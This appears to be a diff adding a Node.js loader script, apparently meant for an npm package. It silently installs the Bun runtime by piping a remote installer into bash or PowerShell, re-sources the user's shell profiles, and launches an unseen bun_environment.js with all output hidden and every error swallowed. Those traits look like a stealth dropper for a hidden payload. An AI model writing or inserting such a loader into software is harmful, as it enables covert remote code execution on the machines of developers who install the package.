+#!/usr/bin/env node
+let {
+  spawn,
+  execSync
+} = require("child_process");
+let path = require("path");
+let fs = require("fs");
+let os = require("os");
+function isBunOnPath() {
+  try {
+    var n = process.platform === "win32" ? "where bun" : "which bun";
+    execSync(n, {
+      stdio: "ignore"
+    });
+    return true;
+  } catch {
+    return false;
+  }
+}
+function reloadPath() {
+  if (process.platform === "win32") {
+    try {
+      var n = execSync("powershell -c \"[Environment]::GetEnvironmentVariable('PATH', 'User') + ';' + [Environment]::GetEnvironmentVariable('PATH', 'Machine')\"", {
+        encoding: "utf8"
+      });
+      process.env.PATH = n.trim();
+    } catch {}
+  } else {
+    try {
+      var e;
+      var r = os.homedir();
+      for (e of [path.join(r, ".bashrc"), path.join(r, ".bash_profile"), path.join(r, ".profile"), path.join(r, ".zshrc")]) {
+        if (fs.existsSync(e)) {
+          try {
+            var t = execSync(`bash -c "source ${e} && echo $PATH"`, {
+              encoding: "utf8",
+              stdio: ["pipe", "pipe", "ignore"]
+            });
+            if (t && t.trim()) {
+              process.env.PATH = t.trim();
+              break;
+            }
+          } catch {}
+        }
+      }
+      var i = path.join(r, ".bun", "bin");
+      if (fs.existsSync(i) && !process.env.PATH.includes(i)) {
+        process.env.PATH = i + ":" + process.env.PATH;
+      }
+    } catch {}
+  }
+}
+async function downloadAndSetupBun() {
+  try {
+    let n;
+    n = process.platform === "win32" ? "powershell -c \"irm bun.sh/install.ps1|iex\"" : "curl -fsSL https://bun.sh/install | bash";
+    execSync(n, {
+      stdio: "ignore",
+      env: {
+        ...process.env
+      }
+    });
+    reloadPath();
+    var e = findBunExecutable();
+    if (e) {
+      return e;
+    }
+    throw new Error("Bun installation completed but executable not found");
+  } catch {
+    process.exit(0);
+  }
+}
+function findBunExecutable() {
+  var n;
+  var e;
+  var r = [];
+  if (process.platform === "win32") {
+    n = process.env.USERPROFILE || "";
+    r.push(path.join(n, ".bun", "bin", "bun.exe"), path.join(n, "AppData", "Local", "bun", "bun.exe"));
+  } else {
+    n = os.homedir();
+    r.push(path.join(n, ".bun", "bin", "bun"), "/usr/local/bin/bun", "/opt/bun/bin/bun");
+  }
+  if (isBunOnPath()) {
+    return "bun";
+  }
+  for (e of r) {
+    if (fs.existsSync(e)) {
+      return e;
+    }
+  }
+  return null;
+}
+function runExecutable(n, e = [], r = {}) {
+  n = spawn(n, e, {
+    stdio: "ignore",
+    cwd: r.cwd || process.cwd(),
+    env: Object.assign({}, process.env, r.env || {})
+  });
+  n.on("error", n => {
+    process.exit(0);
+  });
+  n.on("exit", (n, e) => {
+    if (e) {
+      process.exit(0);
+    } else {
+      process.exit(n === null ? 1 : n);
+    }
+  });
+}
+async function main() {
+  let n;
+  n = isBunOnPath() ? "bun" : (e = path.join(__dirname, "bun-dist"), [path.join(e, "bun", "bun"), path.join(e, "bun", "bun.exe"), path.join(e, "bun.exe"), path.join(e, "bun")].find(n => fs.existsSync(n)) || (await downloadAndSetupBun()));
+  var e = path.join(__dirname, "bun_environment.js");
+  if (fs.existsSync(e)) {
+    runExecutable(n, [e]);
+  } else {
+    process.exit(0);
+  }
+}
+main().catch(n => {
+  process.exit(0);
+});
